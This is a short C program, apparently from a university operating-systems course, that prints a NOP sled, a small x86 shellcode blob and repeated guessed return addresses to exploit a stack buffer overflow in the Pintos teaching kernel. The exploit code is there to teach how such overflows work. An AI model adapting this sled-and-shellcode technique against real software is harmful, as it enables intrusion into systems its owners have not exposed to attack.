/* klaar@ida

   Program to generate a noop sled with accompanying shellcode and a
   good guess as of where all of this data ends up when a buffer
   overflow is exploited in pintos.
 
   This program runs outside pintos. Pipe the output to a pintos
   program with faulty buffer handling to exploit a buffer overflow.

   gcc noopsled.c -o noopsled
 */

#include <stdio.h>

char shellcode[] =
  "\x90\x90\x90\x90\x90\xe9\x0b\x00"
  "\x00\x00\x6a\x02\xcd\x30\x31\xc0"
  "\x50\x40\x50\xcd\x30\xe8\xf0\xff"
  "\xff\xff""crack";

char x86_nop = '\x90';

unsigned guess = 0xc0000000 - 2000 - 300;

int main() //int argc, char* argv[])
{
  int i;
  
  for (i = 0; i < 128; ++i)
    printf("%c", x86_nop);

  for (i = 0; i < 32; ++i)
    printf("%c", shellcode[i]);
    
  for (i = 0; i < (128-32)/4; ++i)
  {
    char* g = (char*)&guess;
    printf("%c", g[3]);
    printf("%c", g[2]);
    printf("%c", g[1]);
    printf("%c", g[0]);
  }    
  printf("\n\n");
}
